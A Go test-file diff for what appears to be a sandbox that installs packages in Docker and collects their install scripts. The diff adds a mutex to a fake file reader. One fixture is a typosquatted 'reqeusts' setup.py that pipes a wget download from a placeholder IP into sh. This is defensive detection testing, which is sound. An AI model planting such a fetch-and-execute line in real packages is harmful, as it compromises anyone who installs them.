@@ -4,6 +4,7 @@ import (
 	"context"
 	"reflect"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -18,7 +19,7 @@ func TestPickScripts(t *testing.T) {
 	ch := []dockerapi.Change{
 		{Kind: "A", Path: "/pkg"},
 		{Kind: "A", Path: "/pkg/reqeusts"},
-		{Kind: "A", Path: "/root/.cache/pip/http-v2/0/setup.py"},                                    // 캐시
+		{Kind: "A", Path: "/root/.cache/pip/http-v2/0/setup.py"}, // 캐시
 		{Kind: "A", Path: "/tmp/pip-build-env-x/overlay/lib/python3.12/site-packages/setuptools/setup.py"}, // 빌드 도구
 		{Kind: "A", Path: "/tmp/pip-install-ab/evil/setup.py"},
 		{Kind: "A", Path: "/tmp/pip-install-ab/evil/pyproject.toml"},
@@ -54,6 +55,7 @@ func TestPickScripts(t *testing.T) {
 type fileFake struct {
 	*fakeDocker
 	files map[string]string
+	mu    sync.Mutex // ReadFile 은 동시에 불린다
 	read  []string
 }
 
@@ -61,7 +63,9 @@ func (f *fileFake) ReadFile(ctx context.Context, _ string, path string, limit in
 	if err := f.wait(ctx, "read"); err != nil {
 		return nil, 0, err
 	}
+	f.mu.Lock()
 	f.read = append(f.read, path)
+	f.mu.Unlock()
 	s, ok := f.files[path]
 	if !ok {
 		return nil, 0, dockerapi.ErrNotFound
@@ -76,7 +80,7 @@ func TestCollectSavesInstallScripts(t *testing.T) {
 	f := &fileFake{fakeDocker: newFake(), files: map[string]string{
 		"/pkg/reqeusts/setup.py": "import subprocess\nsubprocess.run('wget -q -O- http://203.0.113.7/x.sh | sh', shell=True)\n",
 		"/tmp/payload.sh":        strings.Repeat("echo hi\n", FileBytes/8+10), // 상한을 넘는다
-		"/tmp/blob.sh":           "ELF\x00\x01binary",                          // 글이 아니면 저장하지 않는다
+		"/tmp/blob.sh":           "ELF\x00\x01binary",                         // 글이 아니면 저장하지 않는다
 	}}
 	f.changes = []dockerapi.Change{{Kind: "A", Path: "/pkg/reqeusts"}, {Kind: "A", Path: "/tmp/payload.sh"}, {Kind: "A", Path: "/tmp/blob.sh"}}
 	ev, err := New(f, store.NewMemory()).Collect(context.Background(), cid)
